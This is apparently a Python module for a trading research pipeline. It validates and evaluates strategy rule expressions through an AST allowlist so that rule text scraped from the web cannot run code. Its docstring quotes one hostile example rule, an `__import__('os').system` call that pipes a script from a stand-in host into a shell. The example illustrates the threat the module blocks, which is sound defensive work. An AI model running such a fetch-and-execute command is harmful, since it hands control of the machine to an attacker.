"""A deliberately small, safe expression evaluator.

This exists because the research pipeline turns strategy descriptions *from the
internet* into executable rules, and the obvious implementation -- ``eval()``
on the extracted condition string -- is a remote code execution hole with extra
steps. A blog post that says the entry rule is
``__import__('os').system('curl evil.sh | sh')`` would own the machine that is
logged into your broker.

So instead: parse to an AST, walk it, and reject any node type not on the
allowlist. Nothing can be called except the handful of functions registered
here, no attribute access, no subscripting, no imports, no comprehensions, no
dunder anything. If a spec cannot be expressed in this grammar, the spec is
rejected rather than the grammar widened.

Grammar:
    names        indicator columns (rsi, close, ema_fast, atr, ...)
    literals     numbers and booleans only -- no strings
    operators    + - * / % **, comparisons, and/or/not, unary minus
    calls        only the whitelisted helpers below

Everything evaluates over pandas Series so a whole backtest is vectorised.
"""
from __future__ import annotations

import ast
import logging
import operator
from typing import Any, Callable

import numpy as np
import pandas as pd

log = logging.getLogger(__name__)


class UnsafeExpression(ValueError):
    """Raised when an expression uses anything outside the allowlist."""


# ------------------------------------------------------------------ functions


def _crossed_above(a: pd.Series, b: Any) -> pd.Series:
    b_prev = b.shift(1) if isinstance(b, pd.Series) else b
    return (a.shift(1) <= b_prev) & (a > b)


def _crossed_below(a: pd.Series, b: Any) -> pd.Series:
    b_prev = b.shift(1) if isinstance(b, pd.Series) else b
    return (a.shift(1) >= b_prev) & (a < b)


def _rising(a: pd.Series, n: int = 1) -> pd.Series:
    return a > a.shift(int(n))


def _falling(a: pd.Series, n: int = 1) -> pd.Series:
    return a < a.shift(int(n))


def _highest(a: pd.Series, n: int) -> pd.Series:
    return a.rolling(int(n), min_periods=int(n)).max()


def _lowest(a: pd.Series, n: int) -> pd.Series:
    return a.rolling(int(n), min_periods=int(n)).min()


def _abs(a: Any) -> Any:
    return a.abs() if isinstance(a, pd.Series) else abs(a)


SAFE_FUNCTIONS: dict[str, Callable[..., Any]] = {
    "crossed_above": _crossed_above,
    "crossed_below": _crossed_below,
    "rising": _rising,
    "falling": _falling,
    "highest": _highest,
    "lowest": _lowest,
    "abs": _abs,
    "min": lambda a, b: np.minimum(a, b),
    "max": lambda a, b: np.maximum(a, b),
}

BIN_OPS = {
    ast.Add: operator.add,
    ast.Sub: operator.sub,
    ast.Mult: operator.mul,
    ast.Div: operator.truediv,
    ast.Mod: operator.mod,
    ast.Pow: operator.pow,
}

CMP_OPS = {
    ast.Gt: operator.gt,
    ast.GtE: operator.ge,
    ast.Lt: operator.lt,
    ast.LtE: operator.le,
    ast.Eq: operator.eq,
    ast.NotEq: operator.ne,
}

ALLOWED_NODES = (
    ast.Expression, ast.BoolOp, ast.BinOp, ast.UnaryOp, ast.Compare,
    ast.Call, ast.Name, ast.Load, ast.Constant,
    ast.And, ast.Or, ast.Not, ast.USub, ast.UAdd,
    *BIN_OPS.keys(), *CMP_OPS.keys(),
)

MAX_EXPRESSION_LENGTH = 500
MAX_AST_NODES = 200


def validate(expression: str, allowed_names: set[str]) -> None:
    """Raise UnsafeExpression unless every node is on the allowlist."""
    if not expression or not expression.strip():
        raise UnsafeExpression("empty expression")
    if len(expression) > MAX_EXPRESSION_LENGTH:
        raise UnsafeExpression(
            f"expression is {len(expression)} chars, limit {MAX_EXPRESSION_LENGTH}"
        )

    try:
        tree = ast.parse(expression, mode="eval")
    except SyntaxError as exc:
        raise UnsafeExpression(f"could not parse: {exc}") from exc

    nodes = list(ast.walk(tree))
    if len(nodes) > MAX_AST_NODES:
        raise UnsafeExpression(f"expression too complex ({len(nodes)} nodes)")

    for node in nodes:
        if not isinstance(node, ALLOWED_NODES):
            raise UnsafeExpression(
                f"{type(node).__name__} is not permitted in strategy expressions"
            )

        if isinstance(node, ast.Constant):
            if not isinstance(node.value, (int, float, bool)):
                raise UnsafeExpression(
                    f"only numeric and boolean literals are allowed, got "
                    f"{type(node.value).__name__}"
                )

        elif isinstance(node, ast.Call):
            # Only bare names may be called -- blocks obj.method() entirely.
            if not isinstance(node.func, ast.Name):
                raise UnsafeExpression("only direct calls to safe functions allowed")
            if node.func.id not in SAFE_FUNCTIONS:
                raise UnsafeExpression(f"unknown function: {node.func.id}")
            if node.keywords:
                raise UnsafeExpression("keyword arguments are not supported")
            if len(node.args) > 3:
                raise UnsafeExpression("too many arguments")

        elif isinstance(node, ast.Name):
            if node.id.startswith("_"):
                raise UnsafeExpression(f"underscore names are blocked: {node.id}")
            if node.id not in allowed_names and node.id not in SAFE_FUNCTIONS:
                raise UnsafeExpression(
                    f"unknown identifier '{node.id}'. Available: "
                    f"{', '.join(sorted(allowed_names)[:15])}..."
                )


def _eval_node(node: ast.AST, ctx: dict[str, Any]) -> Any:
    if isinstance(node, ast.Expression):
        return _eval_node(node.body, ctx)

    if isinstance(node, ast.Constant):
        return node.value

    if isinstance(node, ast.Name):
        if node.id in ctx:
            return ctx[node.id]
        raise UnsafeExpression(f"unresolved identifier: {node.id}")

    if isinstance(node, ast.BinOp):
        op = BIN_OPS.get(type(node.op))
        if op is None:
            raise UnsafeExpression(f"operator {type(node.op).__name__} not allowed")
        return op(_eval_node(node.left, ctx), _eval_node(node.right, ctx))

    if isinstance(node, ast.UnaryOp):
        val = _eval_node(node.operand, ctx)
        if isinstance(node.op, ast.USub):
            return -val
        if isinstance(node.op, ast.UAdd):
            return val
        if isinstance(node.op, ast.Not):
            return ~val if isinstance(val, pd.Series) else (not val)
        raise UnsafeExpression("unary operator not allowed")

    if isinstance(node, ast.BoolOp):
        values = [_eval_node(v, ctx) for v in node.values]
        combine = (
            operator.and_ if isinstance(node.op, ast.And) else operator.or_
        )
        result = values[0]
        for v in values[1:]:
            # Series need bitwise ops; scalars fall back to python semantics.
            if isinstance(result, pd.Series) or isinstance(v, pd.Series):
                result = combine(
                    result.astype(bool) if isinstance(result, pd.Series) else result,
                    v.astype(bool) if isinstance(v, pd.Series) else v,
                )
            else:
                result = (result and v) if isinstance(node.op, ast.And) else (
                    result or v
                )
        return result

    if isinstance(node, ast.Compare):
        if len(node.ops) != 1 or len(node.comparators) != 1:
            raise UnsafeExpression("chained comparisons are not supported")
        op = CMP_OPS.get(type(node.ops[0]))
        if op is None:
            raise UnsafeExpression("comparison operator not allowed")
        return op(_eval_node(node.left, ctx), _eval_node(node.comparators[0], ctx))

    if isinstance(node, ast.Call):
        fn = SAFE_FUNCTIONS[node.func.id]  # validated already
        return fn(*[_eval_node(a, ctx) for a in node.args])

    raise UnsafeExpression(f"{type(node).__name__} is not permitted")


def evaluate(expression: str, frame: pd.DataFrame) -> pd.Series:
    """Evaluate a validated expression against a feature frame.

    Returns a boolean Series aligned to ``frame``.
    """
    allowed = set(frame.columns)
    validate(expression, allowed)
    tree = ast.parse(expression, mode="eval")

    ctx: dict[str, Any] = {c: frame[c] for c in frame.columns}
    result = _eval_node(tree, ctx)

    if not isinstance(result, pd.Series):
        result = pd.Series(bool(result), index=frame.index)
    return result.fillna(False).astype(bool)
